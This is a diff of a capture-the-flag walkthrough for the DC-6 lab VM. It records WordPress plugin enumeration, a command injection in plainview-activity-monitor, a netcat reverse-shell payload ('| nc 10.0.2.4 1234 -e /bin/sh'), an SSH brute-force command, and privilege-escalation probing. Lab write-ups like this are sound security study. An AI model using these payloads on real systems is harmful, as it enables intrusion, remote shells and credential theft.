@@ -54,10 +54,67 @@ By DCAU
 * Next, I tried to log in to SSH with `mark:helpdesk01` but to no avail either.
 * Doing a dictionary attack with our 5 usernames and passwords and `passwords.txt` did not work either: `hydra -L usernames.txt -P passwords.txt 10.0.2.16 ssh`.
 ![](/screenshots/dc-6/hydraSSHFailed.jpg)
+* Next, I reused `wpscan` to get a fuller picture of the WordPress site using `wpscan -v --url http://wordy`:
+![](/screenshots/dc-6/wpscanFullNoPlugins.jpg)
+* The first piece of information that I tried to use to get a shell was the fact that the Apache's version is `2.4.25`. There is a `Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak` found [here](https://www.exploit-db.com/exploits/42745), which I tried to no avail (no idea why).
+![](/screenshots/dc-6/optionsBleed.jpg)
+* The next piece of information was the fact that `xmlrpc` was running, and I attempted two versions of a python script which would utilise it for brute-forcing found [here](https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit). v1 resulted in multiple errors while v2 resulted in an empty output (no idea why).
+* The last piece of information seen in the screenshot is the `readme.html` file, which did not provide anything useful.
+* Am pretty stuck at this point in time, and only then realised that I had missed out looking for vulnerabilities within the plugins of the WordPress site! Run `wpscan -v --plugins-detection aggressive --url http://wordy`:
+![](/screenshots/dc-6/wpscanPlugins.jpg)
+* There are 3 plugins identified: `akismet`, `plainview-activity-monitor` and `user-role-editor`. The latter 2 have vulnerabilities that result in a Remote Command Execution (RCE) and Privilege Escalation respectively, ones that are more interesting that akismet's unauthenticated stored XSS. Hence, we will try out the latter 2 first.
+
+# Method 1: Remote Command Execution using plainview-activity-monitor
+* The GitHub reference link given by `wpscan` is invalid. The link is not entirely incorrect - perhaps the file was renamed because only the last part of the link is incorrect. The correct link is [here](https://github.com/aas-n/CVE/tree/master/CVE-2018-15877).
+* Open `poc.html`, and have a look.
+* Alternatively, instead of using the given POC, we can simply inject the command via the user interface!
+* Inspecting the textfield element for `IP or integer`, we see that there is a maximum length imposed on the input element, which is 15 characters.
+![](/screenshots/dc-6/ipTextFieldMaxLength.jpg)
+* We will have to modify the value to something bigger (by double-clicking on the value), so that we can enter our command, e.g. 100.
+* Next, enter `www.google.com | cat /etc/passwd`, then press `Lookup`:
+![](/screenshots/dc-6/successfulCommandInjectionPasswordFile)
+* And volia, our command `cat /etc/passwd` is executed!
+* Note: We can type `google.com` instead, leaving out the `www` prefix if you would like to do so.
+* Note: Having our user input solely as `cat /etc/passwd` or `| cat /etc/passwd` does not work, and will result in a delay in seeing the output because the plugin is trying to resolve the command string using `dig` (remember that we saw `Output from dig:` as part of the output alongside the contents of the password file).
+* We can also use Burp Suite to carry out the command injection. This is how a normal POST request looks like after pressing `Lookup`.
+![](/screenshots/dc-6/burpSuiteNormalRequest.jpg)
+* Having intercepted the request, we will now modify it to include `| cat /etc/passwd` under the `ip` parameter content, where our injected command will allow us to view the `/etc/passwd` file.
+![](/screenshots/dc-6/burpSuiteModifiedRequest.jpg)
+* Press `Forward` after that, and volia, we have executed our desired command.
+* Next, we will set up our `netcat` listener on our Kali VM terminal by running `nc -v -l -p 1234`, and then inject our `netcat` command to get our shell by entering `www.google.com | nc 10.0.2.4 1234 -e /bin/sh`, before then pressing `Lookup`:
+![](/screenshots/dc-6/ncEstablishShell.jpg)
+* Note: Remember to change `maxlength` attribute value first before doing the command injection!
+* We have our shell now, and we are user `www-data` as expected.
+* Run `python -c 'import pty; pty.spawn("/bin/bash")'` to spawn our interactive TTY shell.
+* Next, run `find / -user root -perm -4000 -print 2>/dev/null` to search for setuid binaries which we can possibly exploit:
+![](/screenshots/dc-6/setuidBinaries.jpg)
+* Nothing special in the list, so let us try `sudo -l`. However, I realised that we were required to enter the password for user `www-data`, which we do not have. Looking back at the 2 occasions where we used this command in the dc series, it was used when we were logged in as normal users rather than as `www-data`.
+* I decided to find out the OS version that the web server was running, using `cat /etc/issue; uname -a`:
+![](/screenshots/dc-6/vulnerableOSVersion.jpg)
+* Since the OS is `Debian GNU/Linux 9`, I found an exploit [here](https://www.exploit-db.com/exploits/41240) that would provide us with privilege escalation. After using `wget` to upload the script to the `/tmp` directory of the vulnerable web server, it turned out that there was no `make` available. Hence, the exploit could not be carried out:
+![](/screenshots/dc-6/failedExploitNoMake.jpg)
+* I had also downloaded the [unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check), and used `wget` to upload the script, but to no avail when it came to execution:
+![](/screenshots/dc-6/failedPrivEscCheck.jpg)
+* Next, I remembered that we had several other user accounts on the WordPress CMS, and headed to `/home`, and found the directories named `graham`, `jens`, `mark` and `sarah`:
+![](/screenshots/dc-6/homeDirectory.jpg)
+* Going through the respective directories' contents, I found an interesting `things-to-do.txt` file in the directory `stuff` within the directory of `mark`:
+![](/screenshots/dc-6/homeDirectoryContents.jpg)
+* Opening up mark's to-do list, we find the password of user `graham`, which is `GSo7isUM1D4`!
+![](/screenshots/dc-6/thingsToDoTextFile.jpg)
+* It made sense - having the role of a `Help Desk`, `mark` would create new users for them.
+* I had also realised that there was a `backups.sh` within the directory of `jen`. However, running the script does not work at the moment, due to insufficient permissions:
+![](/screenshots/dc-6/jensBackupsErrorMessage.jpg)
+* Next, I decided to switch to user `graham`: `su graham`, and entered his password that we had just discovered.
+* Note: `su mark` with `helpdesk01` does not work.
+* I headed back to run `backups.sh`, after figuring out that `graham` belonged to the group `devs`, where those who were part of the group would have the same permissions as `jens`, the file creator in this case. However, the script was still unsuccessfully executed, but we made some headway still, as compared to running it as user `www-data`.
+![](/screenshots/dc-6/jensBackupsErrorMessageGraham.jpg)
+* I ran `sudo -l` next, remembering that this command would probably work now, as compared to being executed under user `www-data`:
+![](/screenshots/dc-6/sudoCommands.jpg)
+* It turns out that the result of the command gave the same finding that we just derived - about `backups.sh`.
 * To-be-continued...
 
 # Concluding Remarks
 To-be-added
 
 # Other walkthroughs visited
-To-be-added
+1. https://www.hackingarticles.in/dc6-lab-walkthrough/
